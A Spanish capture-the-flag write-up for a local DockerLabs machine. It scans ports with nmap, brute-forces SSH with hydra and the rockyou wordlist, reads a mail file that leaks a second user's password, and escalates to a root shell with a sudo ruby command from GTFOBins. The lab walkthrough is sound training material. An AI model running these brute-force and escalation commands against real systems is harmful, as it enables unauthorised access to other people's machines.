![image](https://github.com/user-attachments/assets/942a080f-db21-4e2e-86bf-b463471fefa3)

```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![Pasted image 20250123104046](https://github.com/user-attachments/assets/b3f900ee-3938-45f7-b054-391c4467bbc8)

tenemos una web y vamos a investigar

![[Pasted image 20250123104131.png]]
la web no tiene nada pero si miramos el codigo fuente podemos encontrar inmformacion
![[Pasted image 20250123104207.png]]

ya tenemos dos posibles usuarios **juan** y **camilo** ahora aplicaremos fuzing para ver si encontramos directorios ocultos con mas informacion

![[Pasted image 20250123104438.png]]
pero no tenemos acceso
![[Pasted image 20250123104454.png]]

------------

bueno no hemos podido encontrar mas informacion que dos usuarios asi que haremos un ataque de fuerza bruta para esto crearemos un archivo el cual contenga los dos posibles usuarios encontrados y usaremos un diccionario para encontrar posibles contrasenas

```bash
nano users.txt
```

![[Pasted image 20250123104723.png]]

ahora haremos el ataque de fuerza bruta

```bash
hydra -L /home/loestbazan/DockerLabs/MaquinasFaciles/Vacaciones/content/users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
```

![[Pasted image 20250123111820.png]]

despues de obtener la contrasena **password1** ingresaremos via ssh

```bash
ssh camilo@172.17.0.2
```

![[Pasted image 20250123110531.png]]

despues de uns breve investigacion en los directorios encontramos un password para juan ya que si recorgamos en el codigo fuente vimos que le habia dejado un correo a camilo 

```bash
cd /var/mail/camilo/correo.txt
```

![[Pasted image 20250123110725.png]]

ahora nos conectaremos

```bash
ssh juan@172.17.0.2
```

![[Pasted image 20250123110851.png]]

```bash
sudo -l
```

![[Pasted image 20250123110931.png]]
en nuestra pag de GTFObins buscamos una fomra de elevar privilegios

![[Pasted image 20250123111046.png]]

![[Pasted image 20250123111109.png]]

```bash
sudo ruby -e 'exec "/bin/sh"'
```

![[Pasted image 20250123111216.png]]
